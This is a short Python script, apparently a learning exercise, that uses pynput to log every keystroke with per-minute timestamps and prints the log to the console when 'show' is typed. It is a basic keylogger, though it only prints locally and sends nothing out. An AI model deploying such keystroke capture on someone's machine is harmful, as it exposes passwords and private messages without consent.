
from datetime import datetime
from pynput.keyboard import Listener, Key

# Keyboard module in Python


WORD = ""
dicti = {}
minte =0
copy=""
def is_show_typed(m):
    global copy
    global WORD
    global dicti
    if "show" in copy :
        WORD = ""
        copy=""
        for k, v in dicti.items():
            if k == m:
                v = v[:-5]
            print(k, v)
        dicti.clear()




# we define function that handles eny key it gets fom the listener function below:
def on_press(key):
    global WORD
    global minte
    global copy
    # if key is space as WORD  wy convert it to space
    if key == Key.space:
        WORD += " "
    key = str(key)
    if len(key) == 3:
        key = key[1:-1]

        # function that bring the real time:
    current_date_and_time = datetime.now()
    current_date_and_time = str(current_date_and_time)

    # the key of time in style
    minte = "\n***" + current_date_and_time[:16] + "***\n"

    # edit WORD by checking if it's new time
    if minte in dicti:
        WORD += key
    else:
        WORD = key

    copy+=key

    # the value
    VALUE = (WORD + "\n")

    # add key and value
    dicti[minte] = VALUE
    # checks if combination "show" in the "WORD" if true prints the key and value

    is_show_typed(minte)


    # define short cut for
    if"ctrl_lKey.shiftX".lower() in copy.lower():
        quit()


with Listener(on_press=on_press) as listener:
    listener.join()


